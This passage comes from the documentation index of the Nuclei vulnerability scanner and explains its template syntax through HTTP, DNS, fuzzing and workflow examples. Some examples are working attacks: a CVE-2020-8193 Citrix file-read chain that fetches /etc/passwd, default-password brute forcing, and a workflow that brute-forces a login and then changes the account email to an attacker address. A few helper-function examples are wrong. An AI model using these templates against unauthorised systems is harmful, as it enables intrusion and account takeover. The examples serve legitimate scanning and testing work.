| GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close matchers : - type : status status : - 200 Here is the list of all available and supported helper functions: Helper Function Description Example len Length of a string len(\"Hello\") // Result: 5 toupper string to uppercase toupper(\"Hello\") // Result: \"HELLO\" tolower string to lowercase tolower(\"Hello\") // Result: \"hello\" replace Replace string parts replace(\"Hello\", \"He\", \"Ha\") // Result: \"Hallo\" trim Remove trailing unicode chars trim(\"aaaHelloddd\", \"ad\") // Result: \"Hello\" trimleft Remove unicode chars from left trimleft(\"aaaHelloddd\", \"ad\") // Result: \"Helloddd\" trimright Remove unicode chars from right trimleft(\"aaaHelloddd\", \"ad\") // Result: \"aaaHello\" trimspace Remove trailing spaces trimspace(\" Hello \") // Result: \"Hello\" trimprefix Trim specified prefix trimprefix(\"aaHelloaa\", \"aa\") // Result: \"Helloaa\" trimsuffix Trim specified suffix trimsuffix(\"aaHelloaa\", \"aa\") // Result: \"aaHello\" base64 Encode string to base64 base64(\"Hello\") // Result: \"SGVsbG8=\" base64_decode Decode string from base64 base64_decode(\"SGVsbG8=\") // Result: \"Hello\" url_encode URL encode a string url_encode(\" https://projectdiscovery.io/test?a=1 \") // Result: \"https:%2F%2Fprojectdiscovery.io%3Ftest=1\" url_decode URL decode a string url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\") // Result: \" https://projectdiscovery.io/test?a=1 \" hex_encode Hex encode a string hex_encode(\"aa\") // Result: \"6161\" hex_decode Hex decode a string hex_decode(\"6161\") // Result: \"aa\" html_escape Hex encode a string html_escape(\" test \") // Result: \"<html><body>test</body></html>\" html_unescape Hex decode a string html_unescape(\"<html><body>test</body></html>\") // Result: \" test \" md5 Calculate md5 of string md5(\"Hello\") // Result: \"8b1a9953c4611296a827abf8c47804d7\" sha256 Calculate sha256 of string sha256(\"Hello\") // Result: \"185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969\" sha1 Calculate sha1 of string sha1(\"Hello\") // Result: \" f7ff9e8 \" contains Verify if a string contains another one contains(\"Hello\", \"lo\") // Result: True regex Verify a regex versus a string regex(\"H([a-z]+)o\", \"Hello\") // Result: True","title":"HTTP Raw requests"},{"location":"guide/#dns-requests","text":"Requests start with a dns block which specifies the start of the requests for the template. # Start the requests for the template right here dns : DNS requests can be fine tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers.","title":"DNS Requests"},{"location":"guide/#type","text":"First thing in the request is type . Request type can be A , NS , CNAME , SOA , PTR , MX , TXT , AAAA . # type is the type for the dns request type : A","title":"Type"},{"location":"guide/#name","text":"The next part of the requests is the name of the request path. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. FQDN - variable is replaced by the hostname/FQDN of the target on runtime. Some sample dynamic variable replacement examples: name : {{ FQDN }} .com # This value will be replaced on execution with the FQDN. # If FQDN is https://this.is.an.example then the # name will get replaced to the following: this.is.an.example.com As of now the tool supports only one question per request.","title":"Name"},{"location":"guide/#class","text":"Class type can be INET , CSNET , CHAOS , HESIOD , NONE and ANY . Usually it's enough to just leave it as INET . # method is the class for the dns request class : inet","title":"Class"},{"location":"guide/#recursion","text":"Recursion is a boolean value, and determines if the resolver should only return cached results, or traverse the whole dns root tree to retrieve fresh results. Generally it's better to leave it as true . # Recursion is a boolean determining if the request is recursive recursion : true","title":"Recursion"},{"location":"guide/#retries","text":"Retries is the number of attempts a dns query is retried before giving up among different resolvers. It's recommended a reasonable value, like 3 . # Retries is a number of retries before giving up on dns resolution retries : 3","title":"Retries"},{"location":"guide/#matchers_1","text":"Matchers are just equal to HTTP, but the search is performed on the whole dns response, therefore it's not necessary to specify the part . Multiple type of combinations and checks can be added to ensure that the results you get are free from false positives. The complex dsl matcher type allows to build complex queries as described in the HTTP section.","title":"Matchers"},{"location":"guide/#types_2","text":"Multiple matchers can be specified in a request. There are basically 3 types of matchers: Matcher Type Part Matched word DNS Response regex DNS Response dsl DNS Response","title":"Types"},{"location":"guide/#example-dns-template","text":"The final example template file for performing A query, and check if CNAME and A records are in the response is as follows: id : dummy-cname-a info : name : Dummy A dns request author : mzack9999 severity : none description : Checks if CNAME and A record is returned. dns : - name : \"{{FQDN}}\" type : A class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition : and","title":"Example DNS Template"},{"location":"guide/#workflows","text":"It's also possible to create conditional templates which executes after matching the condition from the previous templates, mostly useful for vulnerability detection and exploitation and tech based detection and exploitation, single, multiple along with directory based templates can be executed in chained workflow template. Chained workflow supports both HTTP and DNS based templates, workflow consist of two part, variable and logic which makes use of Tengo , A fast script language for Go. Variables:- You can define variable names of your choice referencing template path of your need. You can not use dash (-) in variable name (Tengo rule) Template reference supports both relative/full path. Logic:- Yaml textual string containing the workflow logic in Tengo It's possible to declare variables Supports If and For operators Provide helper functions to interact with the external OS (eg. call external program, write to external file, evaluate environment variables) Templates accepts external arguments, allowing to chain output of one as input of the other","title":"Workflows"},{"location":"guide/#single-template-chain","text":"Example of running single / multiple templates if detect-jira.yaml detects host running Jira application. variables : jira : panels/detect-jira.yaml jira_cve_1 : cves/CVE-2018-20824.yaml jira_cve_2 : cves/CVE-2019-3399.yaml jira_cve_3 : cves/CVE-2019-11581.yaml jira_cve_4 : cves/CVE-2017-18101.yaml logic : | if jira() { jira_cve_1() jira_cve_2() jira_cve_3() jira_cve_4() }","title":"Single template chain"},{"location":"guide/#directory-based-chains","text":"Workflows also support directory, so you can run set of multiple templates at once, useful when scanning for tech based vulnerabilities. variables : jira : panels/detect-jira.yaml jira_pwn : local-templates/jira/ logic : | if jira() { jira_pwn() }","title":"Directory based chains"},{"location":"guide/#chaining-multiple-matchers","text":"In case of multiple matchers, you can define more specific conditions using name of the matcher, as example, here is an template running specific templates in multiple conditions. variables : tech_detect : technologies/tech-detect.yaml wp_users : files/wordpress-user-enumeration.yaml wp_xss : vulnerabilities/wordpress-xss.yaml drupal_rce : vulnerabilities/drupal-rce.yaml joomla_xss : vulnerabilities/joomla-xss.yaml logic : | tech_detect() if tech_detect[\"wordpress\"] { wp_users() wp_xss() } if tech_detect[\"drupal\"] { drupal_rce() } if tech_detect[\"joomla\"] { joomla_xss() } Here is an example of workflow for detecting Jira and running Jira exploits on found hosts.","title":"Chaining multiple matchers"},{"location":"guide/#example-workflow-template","text":"id : workflow-example info : name : Test Workflow Template author : pdteam variables : jira_detect : technologies/jira-detect.yaml jira_cve_1 : cves/CVE-2019-8449.yaml jira_cve_2 : cves/CVE-2019-8451.yaml jira_cve_3 : cves/CVE-2017-9506.yaml jira_cve_4 : cves/CVE-2018-20824.yaml jira_cve_5 : cves/CVE-2019-3396.yaml # Template/s can be defined as variables. # Variables names are user-defind. # Relative/full path can be used to define template path. # Dash (-) can not be used in variable name. # Logics can be used to define condition execution. # As listed below, if jira_detect is true, then only all other templates will be checked. logic : | if jira_detect(){ jira_cve_1() jira_cve_2() jira_cve_3() jira_cve_4() jira_cve_5() }","title":"Example Workflow Template"},{"location":"examples/dns/","text":"Basic template \u00b6 id : basic-dns-example info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\" Multiple matcher \u00b6 id : multiple-matcher info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 5 matchers-condition : or matchers : - type : word name : zendesk words : - \"zendesk.com\" - type : word name : github words : - \"github.io\"","title":"DNS"},{"location":"examples/dns/#basic-template","text":"id : basic-dns-example info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\"","title":"Basic template"},{"location":"examples/dns/#multiple-matcher","text":"id : multiple-matcher info : name : Test DNS Template author : pdteam severity : info dns : - name : \"{{FQDN}}\" type : CNAME class : inet recursion : true retries : 5 matchers-condition : or matchers : - type : word name : zendesk words : - \"zendesk.com\" - type : word name : github words : - \"github.io\"","title":"Multiple matcher"},{"location":"examples/fuzzing/","text":"HTTP Intruder fuzzing \u00b6 id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info # HTTP Intruder fuzzing with in template payload support. requests : - payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Available types: sniper, pitchfork and clusterbomb raw : - | POST /?username={{username}}&paramb={{password}} HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) Host: {{Hostname}} another_header: {{base64(\"password\")}} Accept: */* body=test matchers : - type : word words : - \"Test is test matcher text\" Fuzzing multiple requests \u00b6 id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : # HTTP Intruder fuzzing wordlist based payload support. - payloads : param_a : payloads/prams.txt param_b : payloads/paths.txt attack : clusterbomb # Available types: sniper, pitchfork and clusterbomb raw : # Request with simple param and header manipulation with DSL functions - | POST /?param_a={{param_a}}&paramb={{param_b}} HTTP/1.1 User-Agent: {{param_a}} Host: {{Hostname}} another_header: {{base64(param_b)}} Accept: */* admin=test # Request with body with DSL helper manipulation - | DELETE / HTTP/1.1 User-Agent: nuclei Host: {{Hostname}} {{sha256(param_a)}} - | PUT / HTTP/1.1 Host: {{Hostname}} {{html_escape(param_a)}} + {{hex_encode(param_b))}} matchers : - type : word words : - \"Test is test matcher text\" Authenticated fuzzing \u00b6 id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 testing=parameter # Cookie-reuse maintain the session between all request like browser. cookie-reuse : true matchers : - type : word words : - \"Test is test matcher text\" Dynamic variable support \u00b6 id : CVE-2020-8193 info : name : Citrix unauthenticated LFI author : pdteam severity : high # Source:- https://github.com/jas502n/CVE-2020-8193 # This template covers only the detection part, use the above exploit for the exploit confirmation. requests : - raw : - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Content-Type: application/xml X-NITRO-USER: xpyZxwy6 X-NITRO-PASS: xWXHUJ56 <appfwprofile><login></login></appfwprofile> - | GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close - | GET /menu/neo HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close - | GET /menu/stc HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: randkey <appfwprofile><login></login></appfwprofile> - | POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: randkey <clipermission></clipermission> cookie-reuse : true # Using cookie-reuse to maintain session between each request, same as browser. extractors : - type : regex name : randkey part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" # Using rand_key as dynamic variable to make use of extractors at run time. matchers : - type : regex regex : - \"root:[x*]:0:0:\" part : body","title":"Fuzzing"},{"location":"examples/fuzzing/#http-intruder-fuzzing","text":"id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info # HTTP Intruder fuzzing with in template payload support. requests : - payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Available types: sniper, pitchfork and clusterbomb raw : - | POST /?username={{username}}&paramb={{password}} HTTP/1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) Host: {{Hostname}} another_header: {{base64(\"password\")}} Accept: */* body=test matchers : - type : word words : - \"Test is test matcher text\"","title":"HTTP Intruder fuzzing"},{"location":"examples/fuzzing/#fuzzing-multiple-requests","text":"id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : # HTTP Intruder fuzzing wordlist based payload support. - payloads : param_a : payloads/prams.txt param_b : payloads/paths.txt attack : clusterbomb # Available types: sniper, pitchfork and clusterbomb raw : # Request with simple param and header manipulation with DSL functions - | POST /?param_a={{param_a}}&paramb={{param_b}} HTTP/1.1 User-Agent: {{param_a}} Host: {{Hostname}} another_header: {{base64(param_b)}} Accept: */* admin=test # Request with body with DSL helper manipulation - | DELETE / HTTP/1.1 User-Agent: nuclei Host: {{Hostname}} {{sha256(param_a)}} - | PUT / HTTP/1.1 Host: {{Hostname}} {{html_escape(param_a)}} + {{hex_encode(param_b))}} matchers : - type : word words : - \"Test is test matcher text\"","title":"Fuzzing multiple requests"},{"location":"examples/fuzzing/#authenticated-fuzzing","text":"id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 testing=parameter # Cookie-reuse maintain the session between all request like browser. cookie-reuse : true matchers : - type : word words : - \"Test is test matcher text\"","title":"Authenticated fuzzing"},{"location":"examples/fuzzing/#dynamic-variable-support","text":"id : CVE-2020-8193 info : name : Citrix unauthenticated LFI author : pdteam severity : high # Source:- https://github.com/jas502n/CVE-2020-8193 # This template covers only the detection part, use the above exploit for the exploit confirmation. requests : - raw : - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Content-Type: application/xml X-NITRO-USER: xpyZxwy6 X-NITRO-PASS: xWXHUJ56 <appfwprofile><login></login></appfwprofile> - | GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close - | GET /menu/neo HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close - | GET /menu/stc HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close - | POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: randkey <appfwprofile><login></login></appfwprofile> - | POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1 Host: {{Hostname}} User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: oY39DXzQ X-NITRO-PASS: ZuU9Y9c1 rand_key: randkey <clipermission></clipermission> cookie-reuse : true # Using cookie-reuse to maintain session between each request, same as browser. extractors : - type : regex name : randkey part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" # Using rand_key as dynamic variable to make use of extractors at run time. matchers : - type : regex regex : - \"root:[x*]:0:0:\" part : body","title":"Dynamic variable support"},{"location":"examples/http/","text":"Basic Template \u00b6 id : basic-example info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - {{ BaseURL }} / matchers : - type : word words : - \"This is test matcher text\" Multiple matchers \u00b6 id : http-multiple-matchers info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - {{ BaseURL }} / matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" part : header Matchers with conditions \u00b6 id : matchers-conditions info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - {{ BaseURL }} / matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : and part : header - type : word words : - \"PHP\" part : body Multiple matcher conditions \u00b6 id : multiple-matchers-conditions info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - {{ BaseURL }} / matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - PHP part : body Custom headers \u00b6 id : custom-headers info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET # Example of sending some headers to the servers headers : X-Client-IP : 127.0.0.1 X-Remote-IP : 127.0.0.1 X-Remote-Addr : 127.0.0.1 X-Forwarded-For : 127.0.0.1 X-Originating-IP : 127.0.0.1 path : - {{ BaseURL }} /server-status matchers : - type : word words : - Apache Server Status - Server Version condition : and POST requests \u00b6 id : post-request info : name : Test HTTP Template author : pdteam severity : info requests : - method : POST path : - {{ BaseURL }} /admin body : 'admin=test' matchers : - type : word words : - Welcome Admin","title":"HTTP"},{"location":"examples/http/#basic-template","text":"id : basic-example info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - {{ BaseURL }} / matchers : - type : word words : - \"This is test matcher text\"","title":"Basic Template"},{"location":"examples/http/#multiple-matchers","text":"id : http-multiple-matchers info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - {{ BaseURL }} / matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" part : header","title":"Multiple matchers"},{"location":"examples/http/#matchers-with-conditions","text":"id : matchers-conditions info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - {{ BaseURL }} / matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : and part : header - type : word words : - \"PHP\" part : body","title":"Matchers with conditions"},{"location":"examples/http/#multiple-matcher-conditions","text":"id : multiple-matchers-conditions info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET path : - {{ BaseURL }} / matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - PHP part : body","title":"Multiple matcher conditions"},{"location":"examples/http/#custom-headers","text":"id : custom-headers info : name : Test HTTP Template author : pdteam severity : info requests : - method : GET # Example of sending some headers to the servers headers : X-Client-IP : 127.0.0.1 X-Remote-IP : 127.0.0.1 X-Remote-Addr : 127.0.0.1 X-Forwarded-For : 127.0.0.1 X-Originating-IP : 127.0.0.1 path : - {{ BaseURL }} /server-status matchers : - type : word words : - Apache Server Status - Server Version condition : and","title":"Custom headers"},{"location":"examples/http/#post-requests","text":"id : post-request info : name : Test HTTP Template author : pdteam severity : info requests : - method : POST path : - {{ BaseURL }} /admin body : 'admin=test' matchers : - type : word words : - Welcome Admin","title":"POST requests"},{"location":"examples/raw/","text":"Basic template \u00b6 id : basic-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 matchers : - type : word words : - \"Test is test matcher text\" Multiple RAW request \u00b6 id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 testing=parameter matchers : - type : word words : - \"Test is test matcher text\"","title":"RAW HTTP"},{"location":"examples/raw/#basic-template","text":"id : basic-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 matchers : - type : word words : - \"Test is test matcher text\"","title":"Basic template"},{"location":"examples/raw/#multiple-raw-request","text":"id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 testing=parameter matchers : - type : word words : - \"Test is test matcher text\"","title":"Multiple RAW request"},{"location":"examples/workflow/","text":"Basic Template \u00b6 id : workflow-example info : name : Test Workflow Template author : pdteam variables : jira_detect : technologies/jira-detect.yaml jira_cve_1 : cves/CVE-2019-8449.yaml jira_cve_2 : cves/CVE-2019-8451.yaml jira_cve_3 : cves/CVE-2017-9506.yaml jira_cve_4 : cves/CVE-2018-20824.yaml jira_cve_5 : cves/CVE-2019-3396.yaml # Template/s can be defined as variables. # Variables names are user-defind. # Relative/full path can be used to define template path. # Dash (-) can not be used in variable name. # Logics can be used to define condition execution. # As listed below, if jira_detect is true, then only all other templates will be checked. logic : | if jira_detect(){ jira_cve_1() jira_cve_2() jira_cve_3() jira_cve_4() jira_cve_5() } Multiple Matchers \u00b6 id : workflow-multiple-matcher info : name : Test Workflow Template author : pdteam variables : tech_detect : technologies/tech-detect.yaml wp_users : files/wordpress-user-enumeration.yaml # Template/s can be defined as variables. # Variables names are user-defind. # Relative/full path can be used to define template path. # Dash (-) can not be used in variable name. # Logics can be used to define condition execution. # As listed below, if jira_detect is true, then only all other templates will be checked. logic : | tech_detect() // Run the template // Verify matchers of your choice if tech_detect[\"wordpress\"] { // Run next template if matched wp_users() } Multiple Matcher Chain \u00b6 id : workflow-multiple-matcher info : name : Test Workflow Template author : pdteam variables : tech_detect : technologies/tech-detect.yaml wp_users : files/wordpress-user-enumeration.yaml wp_xss : vulnerabilities/wordpress-xss.yaml drupal_rce : vulnerabilities/drupal-rce.yaml joomla_xss : vulnerabilities/joomla-xss.yaml # Template/s can be defined as variables. # Variables names are user-defind. # Relative/full path can be used to define template path. # Dash (-) can not be used in variable name. # Logics can be used to define condition execution. # As listed below, if jira_detect is true, then only all other templates will be checked. logic : | tech_detect() if tech_detect[\"wordpress\"] { wp_users() wp_xss() } if tech_detect[\"drupal\"] { drupal_rce() } if tech_detect[\"joomla\"] { joomla_xss() } Custom headers \u00b6 id : custom-headers info : name : Test Workflow Template author : pdteam # Cookie-Reuse and custom headers within workflow cookie-reuse : true variables : bruteforce : nuclei-templates/examples/bruteforce-login.yaml pwnemail : nuclei-templates/examples/pwn-email.yaml logic : | // module import fmt := import(\"fmt\") os := import(\"os\") // defining custom headers externalHeaders := { \"x-bug-bounty\": \"mzack9999\", } // defining custom parameters externalArgumentsBrute := { \"username\": \"mzack9999\", \"passwords\": [\"pass1\", \"pass2\", \"pass3\"] } // defining custom parameters externalArgumentsPwn := { \"newemail\": \"attacker@pwn.something\", } if bruteforce(externalHeaders, externalArgumentsBrute) { // template `pwnemail` will use cookies set by `bruteforce` pwnemail(externalHeaders, externalArgumentsPwn) } Custom workflow \u00b6 id : custom-workflows info : name : Test Workflow Template author : pdteam variables : google_key : tokens/google-api-key.yaml logic : | fmt := import(\"fmt\") os := import(\"os\") if google_key() { // send notification via slack // apikey is the name of extractor defind in google-api-key.yaml slacktoken := os.getenv(\"slacktoken\") slackCmd := os.exec(\"slacknotify\", \"-key\", slacktoken, google_key[\"apikey\"]) slackCmd.run() // saving data on the system file := os.create(\"workflow.output.txt\") file.write_string(google_key[\"apikey\"]) file.close() } }","title":"Workflow"},{"location":"examples/workflow/#basic-template","text":"id : workflow-example info : name : Test Workflow Template author : pdteam variables : jira_detect : technologies/jira-detect.yaml jira_cve_1 : cves/CVE-2019-8449.yaml jira_cve_2 : cves/CVE-2019-8451.yaml jira_cve_3 : cves/CVE-2017-9506.yaml jira_cve_4 : cves/CVE-2018-20824.yaml jira_cve_5 : cves/CVE-2019-3396.yaml # Template/s can be defined as variables. # Variables names are user-defind. # Relative/full path can be used to define template path. # Dash (-) can not be used in variable name. # Logics can be used to define condition execution. # As listed below, if jira_detect is true, then only all other templates will be checked. logic : | if jira_detect(){ jira_cve_1() jira_cve_2() jira_cve_3() jira_cve_4() jira_cve_5() }","title":"Basic Template"},{"location":"examples/workflow/#multiple-matchers","text":"id : workflow-multiple-matcher info : name : Test Workflow Template author : pdteam variables : tech_detect : technologies/tech-detect.yaml wp_users : files/wordpress-user-enumeration.yaml # Template/s can be defined as variables. # Variables names are user-defind. # Relative/full path can be used to define template path. # Dash (-) can not be used in variable name. # Logics can be used to define condition execution. # As listed below, if jira_detect is true, then only all other templates will be checked. logic : | tech_detect() // Run the template // Verify matchers of your choice if tech_detect[\"wordpress\"] { // Run next template if matched wp_users() }","title":"Multiple Matchers"},{"location":"examples/workflow/#multiple-matcher-chain","text":"id : workflow-multiple-matcher info : name : Test Workflow Template author : pdteam variables : tech_detect : technologies/tech-detect.yaml wp_users : files/wordpress-user-enumeration.yaml wp_xss : vulnerabilities/wordpress-xss.yaml drupal_rce : vulnerabilities/drupal-rce.yaml joomla_xss : vulnerabilities/joomla-xss.yaml # Template/s can be defined as variables. # Variables names are user-defind. # Relative/full path can be used to define template path. # Dash (-) can not be used in variable name. # Logics can be used to define condition execution. # As listed below, if jira_detect is true, then only all other templates will be checked. logic : | tech_detect() if tech_detect[\"wordpress\"] { wp_users() wp_xss() } if tech_detect[\"drupal\"] { drupal_rce() } if tech_detect[\"joomla\"] { joomla_xss() }","title":"Multiple Matcher Chain"},{"location":"examples/workflow/#custom-headers","text":"id : custom-headers info : name : Test Workflow Template author : pdteam # Cookie-Reuse and custom headers within workflow cookie-reuse : true variables : bruteforce : nuclei-templates/examples/bruteforce-login.yaml pwnemail : nuclei-templates/examples/pwn-email.yaml logic : | // module import fmt := import(\"fmt\") os := import(\"os\") // defining custom headers externalHeaders := { \"x-bug-bounty\": \"mzack9999\", } // defining custom parameters externalArgumentsBrute := { \"username\": \"mzack9999\", \"passwords\": [\"pass1\", \"pass2\", \"pass3\"] } // defining custom parameters externalArgumentsPwn := { \"newemail\": \"attacker@pwn.something\", } if bruteforce(externalHeaders, 